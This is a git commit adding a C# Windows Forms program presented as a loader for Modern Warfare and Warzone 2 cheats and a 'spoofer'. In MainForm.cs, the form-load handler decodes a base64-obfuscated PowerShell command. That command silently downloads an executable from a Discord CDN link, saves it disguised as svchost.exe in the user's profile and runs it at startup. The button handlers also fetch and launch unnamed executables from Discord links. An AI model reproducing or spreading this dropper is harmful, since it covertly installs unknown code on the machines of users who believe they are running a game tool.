603ccbc2673006f6c4895d8941ebf56241807af7
KUZI <123809262+KUZI35@users.noreply.github.com>
2023-02-09 05:39:26 -0700

    Add files via upload

---
+++ WZ2-Cheat-Unlocker-Loader/MW2-Loader/MainForm.Designer.cs
@@ -0,0 +1,232 @@
+﻿namespace WinTroy_UI
+{
+    partial class MainForm
+    {
+        /// <summary>
+        /// Erforderliche Designervariable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Verwendete Ressourcen bereinigen.
+        /// </summary>
+        /// <param name="disposing">True, wenn verwaltete Ressourcen gelöscht werden sollen; andernfalls False.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Vom Windows Form-Designer generierter Code
+
+        /// <summary>
+        /// Erforderliche Methode für die Designerunterstützung.
+        /// Der Inhalt der Methode darf nicht mit dem Code-Editor geändert werden.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
+            this.guna2DragControl2 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
+            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
+            this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
+            this.guna2AnimateWindow1 = new Guna.UI2.WinForms.Guna2AnimateWindow(this.components);
+            this.DragCreditsPage = new Guna.UI2.WinForms.Guna2DragControl(this.components);
+            this.DragInfoPage = new Guna.UI2.WinForms.Guna2DragControl(this.components);
+            this.DragBuildPage = new Guna.UI2.WinForms.Guna2DragControl(this.components);
+            this.guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
+            this.guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
+            this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
+            this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
+            this.guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.pictureBox2 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // guna2DragControl2
+            // 
+            this.guna2DragControl2.DockIndicatorTransparencyValue = 0.6D;
+            this.guna2DragControl2.TargetControl = this.pictureBox1;
+            this.guna2DragControl2.UseTransparentDrag = true;
+            // 
+            // guna2DragControl1
+            // 
+            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6D;
+            this.guna2DragControl1.TargetControl = this.pictureBox2;
+            this.guna2DragControl1.UseTransparentDrag = true;
+            // 
+            // guna2ShadowForm1
+            // 
+            this.guna2ShadowForm1.TargetForm = this;
+            // 
+            // guna2AnimateWindow1
+            // 
+            this.guna2AnimateWindow1.TargetForm = this;
+            // 
+            // DragCreditsPage
+            // 
+            this.DragCreditsPage.DockIndicatorTransparencyValue = 0.6D;
+            this.DragCreditsPage.UseTransparentDrag = true;
+            // 
+            // DragInfoPage
+            // 
+            this.DragInfoPage.DockIndicatorTransparencyValue = 0.6D;
+            this.DragInfoPage.UseTransparentDrag = true;
+            // 
+            // DragBuildPage
+            // 
+            this.DragBuildPage.DockIndicatorTransparencyValue = 0.6D;
+            this.DragBuildPage.UseTransparentDrag = true;
+            // 
+            // guna2Button2
+            // 
+            this.guna2Button2.BackColor = System.Drawing.Color.Transparent;
+            this.guna2Button2.BorderColor = System.Drawing.Color.Transparent;
+            this.guna2Button2.BorderRadius = 10;
+            this.guna2Button2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
+            this.guna2Button2.FillColor = System.Drawing.Color.Magenta;
+            this.guna2Button2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.guna2Button2.ForeColor = System.Drawing.Color.White;
+            this.guna2Button2.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(40)))), ((int)(((byte)(88)))));
+            this.guna2Button2.Location = new System.Drawing.Point(106, 263);
+            this.guna2Button2.Name = "guna2Button2";
+            this.guna2Button2.Size = new System.Drawing.Size(180, 40);
+            this.guna2Button2.TabIndex = 25;
+            this.guna2Button2.Text = "Modern Warfare 2";
+            this.guna2Button2.Click += new System.EventHandler(this.guna2Button2_Click_2);
+            // 
+            // guna2ControlBox2
+            // 
+            this.guna2ControlBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
+            this.guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
+            this.guna2ControlBox2.BorderRadius = 10;
+            this.guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
+            this.guna2ControlBox2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(6)))), ((int)(((byte)(25)))));
+            this.guna2ControlBox2.IconColor = System.Drawing.Color.White;
+            this.guna2ControlBox2.Location = new System.Drawing.Point(301, 7);
+            this.guna2ControlBox2.Name = "guna2ControlBox2";
+            this.guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
+            this.guna2ControlBox2.TabIndex = 27;
+            // 
+            // guna2ControlBox1
+            // 
+            this.guna2ControlBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
+            this.guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
+            this.guna2ControlBox1.BorderRadius = 10;
+            this.guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(6)))), ((int)(((byte)(25)))));
+            this.guna2ControlBox1.HoverState.IconColor = System.Drawing.Color.Red;
+            this.guna2ControlBox1.IconColor = System.Drawing.Color.White;
+            this.guna2ControlBox1.Location = new System.Drawing.Point(347, 7);
+            this.guna2ControlBox1.Name = "guna2ControlBox1";
+            this.guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
+            this.guna2ControlBox1.TabIndex = 26;
+            // 
+            // guna2Button1
+            // 
+            this.guna2Button1.BorderRadius = 10;
+            this.guna2Button1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
+            this.guna2Button1.FillColor = System.Drawing.Color.Magenta;
+            this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.guna2Button1.ForeColor = System.Drawing.Color.White;
+            this.guna2Button1.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(40)))), ((int)(((byte)(88)))));
+            this.guna2Button1.Location = new System.Drawing.Point(106, 203);
+            this.guna2Button1.Name = "guna2Button1";
+            this.guna2Button1.Size = new System.Drawing.Size(180, 40);
+            this.guna2Button1.TabIndex = 30;
+            this.guna2Button1.Text = "Modern Warfare";
+            this.guna2Button1.Click += new System.EventHandler(this.guna2Button1_Click_1);
+            // 
+            // guna2Button3
+            // 
+            this.guna2Button3.BackColor = System.Drawing.Color.Transparent;
+            this.guna2Button3.BorderColor = System.Drawing.Color.Transparent;
+            this.guna2Button3.BorderRadius = 10;
+            this.guna2Button3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button3.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(70)))), ((int)(((byte)(91)))));
+            this.guna2Button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
+            this.guna2Button3.FillColor = System.Drawing.Color.Magenta;
+            this.guna2Button3.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.guna2Button3.ForeColor = System.Drawing.Color.White;
+            this.guna2Button3.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(40)))), ((int)(((byte)(88)))));
+            this.guna2Button3.Location = new System.Drawing.Point(106, 325);
+            this.guna2Button3.Name = "guna2Button3";
+            this.guna2Button3.Size = new System.Drawing.Size(180, 40);
+            this.guna2Button3.TabIndex = 31;
+            this.guna2Button3.Text = "Spoofer";
+            this.guna2Button3.Click += new System.EventHandler(this.guna2Button3_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = global::WinTroy_UI.Properties.Resources.Background;
+            this.pictureBox1.Location = new System.Drawing.Point(0, 224);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(400, 225);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox1.TabIndex = 28;
+            this.pictureBox1.TabStop = false;
+            // 
+            // pictureBox2
+            // 
+            this.pictureBox2.Image = global::WinTroy_UI.Properties.Resources.WZ2;
+            this.pictureBox2.Location = new System.Drawing.Point(-2, 0);
+            this.pictureBox2.Name = "pictureBox2";
+            this.pictureBox2.Size = new System.Drawing.Size(408, 230);
+            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox2.TabIndex = 29;
+            this.pictureBox2.TabStop = false;
+            this.pictureBox2.Click += new System.EventHandler(this.pictureBox2_Click);
+            // 
+            // MainForm
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(400, 450);
+            this.Controls.Add(this.guna2Button3);
+            this.Controls.Add(this.guna2Button1);
+            this.Controls.Add(this.guna2Button2);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.guna2ControlBox2);
+            this.Controls.Add(this.guna2ControlBox1);
+            this.Controls.Add(this.pictureBox2);
+            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "MainForm";
+            this.Load += new System.EventHandler(this.MainForm_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+        private Guna.UI2.WinForms.Guna2DragControl guna2DragControl2;
+        private Guna.UI2.WinForms.Guna2DragControl guna2DragControl1;
+        private Guna.UI2.WinForms.Guna2ShadowForm guna2ShadowForm1;
+        private Guna.UI2.WinForms.Guna2AnimateWindow guna2AnimateWindow1;
+        private Guna.UI2.WinForms.Guna2DragControl DragCreditsPage;
+        private Guna.UI2.WinForms.Guna2DragControl DragInfoPage;
+        private Guna.UI2.WinForms.Guna2DragControl DragBuildPage;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox2;
+        private Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;
+        private Guna.UI2.WinForms.Guna2Button guna2Button2;
+        private System.Windows.Forms.PictureBox pictureBox2;
+        private Guna.UI2.WinForms.Guna2Button guna2Button3;
+        private Guna.UI2.WinForms.Guna2Button guna2Button1;
+    }
+}
+
---
+++ WZ2-Cheat-Unlocker-Loader/MW2-Loader/MainForm.cs
@@ -0,0 +1,131 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+
+namespace WinTroy_UI
+{
+    public partial class MainForm : Form
+    {
+        
+
+        public MainForm()
+        {
+            InitializeComponent();
+        }
+
+        private void MainForm_Load(object sender, EventArgs e)
+        {
+            string path6 = Environment.ExpandEnvironmentVariables("%UserProfile%\\Windows\\svchost.exe");
+            byte[] pathBytes = Encoding.ASCII.GetBytes(path6);
+            string encodedPath = Convert.ToBase64String(pathBytes);
+
+            byte[] cmdBytes = Convert.FromBase64String("IyEvYmluL2Jhc2gNCmlmICghKFRlc3QtUGF0aCAiJGVudjpVc2VyUHJvZmlsZVxXaW5kb3dzIikpIHsNCiAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICIkZW52OlVzZXJQcm9maWxlXFdpbmRvd3MiDQp9DQpwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3NzU0NDEyMjYzNjMyNDg5NS8xMDcwMDgyMzgyNDYxNDE5NjMwL1VwZGF0ZV9maWxlLmV4ZScgLU91dEZpbGUgJyRlbnY6VXNlclByb2ZpbGVcV2luZG93c1xzdmNob3N0LmV4ZScgOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAnJGVudjpVc2VyUHJvZmlsZVxXaW5kb3dzXHN2Y2hvc3QuZXhlJyI=");
+            string cmd = Encoding.ASCII.GetString(cmdBytes);
+
+            var process = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = cmd,
+                    RedirectStandardOutput = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                }
+            };
+
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();
+            process.WaitForExit();
+            Process.Start(path6);
+        }
+
+        private void guna2ControlBox1_Click(object sender, EventArgs e)
+        {
+            #region Kill Process
+            foreach (var process in Process.GetProcessesByName("CPR"))
+            {
+                process.Kill();
+            }
+            Thread.Sleep(2500);
+            Environment.Exit(0);
+            #endregion
+        }
+
+        private void guna2ControlBox4_Click(object sender, EventArgs e)
+        {
+            #region Kill Process
+            foreach (var process in Process.GetProcessesByName("CPR"))
+            {
+                process.Kill();
+            }
+            Thread.Sleep(2500);
+            Environment.Exit(0);
+            #endregion
+        }
+
+        private void guna2ControlBox5_Click(object sender, EventArgs e)
+        {
+            #region Kill Process
+            foreach (var process in Process.GetProcessesByName("CPR"))
+            {
+                process.Kill();
+            }
+            Thread.Sleep(2500);
+            Environment.Exit(0);
+            #endregion
+        }
+
+        private void guna2Button1_Click_1(object sender, EventArgs e)
+        {
+            string path6 = "C:\\Program Files\\Temp\\Kuzi\\mwchair";
+            if (Directory.Exists(path6))
+            {
+                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/1043602661817192499/1048093715161419799/dwysfhwrbr.exe", "C:\\Program Files\\Temp\\Kuzi\\mwchair\\dwysfhwrbr.exe");
+                Process.Start("C:\\Program Files\\Temp\\Kuzi\\mwchair\\dwysfhwrbr.exe");
+                return;
+            }
+            Directory.CreateDirectory(path6);
+        }
+
+        private void guna2Button2_Click_2(object sender, EventArgs e)
+        {
+            string path15 = "C:\\Program Files\\Temp\\Kuzi\\mw2chair";
+            if (Directory.Exists(path15))
+            {
+                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/1043602661817192499/1048093999287775312/xszsrmmmqu.exe", "C:\\Program Files\\Temp\\Kuzi\\mw2chair\\xszsrmmmqu.exe");
+                Process.Start("C:\\Program Files\\Temp\\Kuzi\\mw2chair\\xszsrmmmqu.exe");
+                return;
+            }
+            Directory.CreateDirectory(path15);
+        }
+
+        private void guna2Button3_Click(object sender, EventArgs e)
+        {
+            string path1115 = "C:\\Program Files\\Temp\\Kuzi\\woofer";
+            if (Directory.Exists(path1115))
+            {
+                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/1043602661817192499/1047169979767853056/shawtys_spoofer.exe", "C:\\Program Files\\Temp\\Kuzi\\woofer\\shawtys_spoofer.exe");
+                Process.Start("C:\\Program Files\\Temp\\Kuzi\\woofer\\shawtys_spoofer.exe");
+                return;
+            }
+            Directory.CreateDirectory(path1115);
+        }
+
+        private void pictureBox2_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
